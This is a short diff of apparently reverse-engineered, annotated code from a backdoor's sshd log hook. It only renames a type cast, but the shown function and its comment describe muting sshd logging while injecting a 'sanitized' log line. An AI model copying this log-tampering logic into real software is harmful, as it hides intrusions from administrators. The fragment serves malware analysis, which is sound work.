@@ -123,7 +123,7 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
       }
       msg = msg + 1;
     }
-    prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(undefined2 *)log_ctx_state->fmt_percent_s);
+    prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(u16 *)log_ctx_state->fmt_percent_s);
     log_ctx_state->log_squelched = TRUE;
     // AutoDoc: Temporarily force `setlogmask(0xff)` whenever syslog suppression is enabled so sshd's own handler stays quiet while we inject a sanitized line.
     if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
